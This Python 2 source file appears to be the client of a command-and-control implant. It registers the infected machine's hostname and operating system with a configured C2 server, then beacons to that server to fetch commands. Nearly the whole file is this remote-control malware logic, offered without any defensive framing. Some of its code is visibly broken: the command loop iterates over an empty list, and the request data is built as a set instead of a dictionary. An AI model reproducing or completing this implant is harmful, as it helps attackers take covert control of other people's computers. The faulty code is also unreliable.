import json
from socket import gethostname
from sys import platform

from .settings import *
from .lib.decorators import Request

from .db.SQLite import Helper

db = Helper()
fetch = Request(db.get_config('c2_host'), port=int(db.get_config('c2_port')))



def register():
    data = {
        "name": gethostname(),
        "os": platform,
    }

    uuid = db.get_config('uuid')
    if uuid:
        data['uuid'] = uuid

    @fetch('/api/agents/', proto="POST", data=data)
    def handle(resp):
        print resp
        resp_json = json.loads(resp)
        db.set_config('uuid', resp_json['uuid'])
    handle()


@fetch('/api/commands/', data={"uuid", db.get_config('uuid')})
def beacon(resp):
    resps_json = []
    for cmd in resps_json:
        resps_json.append(json.loads(cmd))

    cmds = map(lambda x: [x['id'], x['cmd']], resps_json)

    return cmds

